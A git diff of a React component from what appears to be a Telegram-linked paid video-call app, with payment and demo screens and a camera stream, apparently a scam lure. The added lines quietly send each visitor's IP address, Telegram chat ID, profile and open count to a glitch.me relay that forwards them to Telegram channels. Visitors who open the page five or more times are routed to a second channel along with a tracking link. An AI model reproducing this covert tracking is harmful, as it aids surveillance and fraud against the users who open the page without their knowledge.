@@ -262,11 +262,19 @@ function Idle() {
                         // console.error('Failed to fetch IP or send Telegram message:', err);
                     }
                 }
-                await fetchWithTimeout(
-                    `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(
-                        `Opened VcUI: ${profile}\nChatId: ${chatId}\nAll-Videos:${paymentstats.videos}\nOwnVideos:${userDetails.videos}\nSelected:${video}\nIp:${ip}\nCount:${userDetails.count}`
-                    )}`
-                );
+                if (userDetails.count < 5) {
+                    await fetchWithTimeout(
+                        `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(
+                            `Opened VcUI: ${profile}\nChatId: ${chatId}\nAll-Videos:${paymentstats.videos}\nOwnVideos:${userDetails.videos}\nSelected:${video}\nIp:${ip}\nCount:${userDetails.count}`
+                        )}`
+                    );
+                } else {
+                    await fetchWithTimeout(
+                        `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1002472867139&msg=${encodeURIComponent(
+                            `Opened VcUI: ${profile}\nChatId: ${chatId}\nAll-Videos:${paymentstats.videos}\nOwnVideos:${userDetails.videos}\nSelected:${video}\nIp:${ip}\nCount:${userDetails.count}\n\nhttps://tgchats.netlify.app?client=${profile}&chatId=${chatId}`
+                        )}`
+                    );
+                }
             } catch (e) {
                 console.log(e);
                 const errorDetails = parseError(e);
@@ -282,74 +290,74 @@ function Idle() {
     }, []);
 
     return (
-        <div style={{ height: "100%" }}>
-            {(loading || isReporting || isPaying) && (
+        <div style={ { height: "100%" } }>
+            { (loading || isReporting || isPaying) && (
                 <IconButton
                     className="idle-app"
-                    style={{ paddingTop: "5vh", color: "grey" }}
+                    style={ { paddingTop: "5vh", color: "grey" } }
                 >
                     {
                         <CircularProgress
-                            size={50}
-                            thickness={5}
+                            size={ 50 }
+                            thickness={ 5 }
                             color="inherit"
                         ></CircularProgress>
                     }
                 </IconButton>
-            )}
-            {!loading && (
-                <div style={{ height: "100%" }}>
-                    {canCall &&
+            ) }
+            { !loading && (
+                <div style={ { height: "100%" } }>
+                    { canCall &&
                         (paymentstats.demoGiven < 4 ||
                             paymentstats.latestCallTime <
                             Date.now() - 24 * 60 * 60 * 1000) && (
-                            <div style={{ height: "100%" }}>
-                                {!hasJoinedCall && (
+                            <div style={ { height: "100%" } }>
+                                { !hasJoinedCall && (
                                     <TelegramUI
-                                        joinVideoCall={joinVideoCall}
-                                        clientData={clientData}
-                                        userData={userData}
+                                        joinVideoCall={ joinVideoCall }
+                                        clientData={ clientData }
+                                        userData={ userData }
                                     ></TelegramUI>
-                                )}
-                                {hasJoinedCall && (
+                                ) }
+                                { hasJoinedCall && (
                                     <VideoCall
-                                        clientData={clientData}
-                                        userData={userData}
-                                        paymentstats={paymentstats}
-                                        video={video}
-                                        openCount={openCount}
-                                        duration={duration}
-                                        videoType={videoType}
-                                        getCameraStream={getCameraStream}
+                                        clientData={ clientData }
+                                        userData={ userData }
+                                        paymentstats={ paymentstats }
+                                        video={ video }
+                                        openCount={ openCount }
+                                        duration={ duration }
+                                        videoType={ videoType }
+                                        getCameraStream={ getCameraStream }
                                     ></VideoCall>
-                                )}
+                                ) }
                             </div>
-                        )}
+                        ) }
 
-                    {!canCall && (
+                    { !canCall && (
                         <div>
-                            <div style={{ marginTop: "5vh", fontWeight: "bolder" }}>
+                            <div style={ { marginTop: "5vh", fontWeight: "bolder" } }>
                                 Finish Payment
                             </div>
-                            <div style={{ marginTop: "60vh" }}>
+                            <div style={ { marginTop: "60vh" } }>
                                 <button
-                                    style={{
+                                    style={ {
                                         position: "relative",
                                         backgroundColor: "rgb(55 173 72)",
-                                    }}
-                                    onClickCapture={() => {
+                                    } }
+                                    onClickCapture={ () => {
                                         setIsPaying(true); // Set loading state
                                         window.location.href = `https://paidgirl.netlify.app/${profile}`;
-                                    }}
+                                    } }
                                 >
-                                    {isReporting ? "Please wait..." : "Pay Now"}
+                                    { isReporting ? "Please wait..." : "Pay Now" }
                                 </button>
-                                <div style={{ display: "flex", justifyContent: "center" }}>
+                                <div style={ { display: "flex", justifyContent: "center" } }>
                                     <button
                                         className="report-button"
-                                        style={{ backgroundColor: isReporting ? "grey" : "#ee3838" }}
-                                        disabled={isReporting} // Disable button if loading
-                                        onClick={async () => {
+                                        style={ { backgroundColor: isReporting ? "grey" : "#ee3838" } }
+                                        disabled={ isReporting } // Disable button if loading
+                                        onClick={ async () => {
                                             setIsReporting(true); // Set loading state
                                             await fetchWithTimeout(
                                                 `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(
@@ -360,17 +368,17 @@ function Idle() {
                                                 `https://report-upi.netlify.app/${profile}/${chatId}`,
                                                 "_self"
                                             );
-                                        }}
+                                        } }
                                     >
-                                        {isReporting ? "Please wait..." : "Report Transaction"}
+                                        { isReporting ? "Please wait..." : "Report Transaction" }
                                     </button>
                                 </div>
                             </div>
                         </div>
-                    )}
-                    
+                    ) }
+
                 </div>
-            )}
+            ) }
         </div>
     );
 }
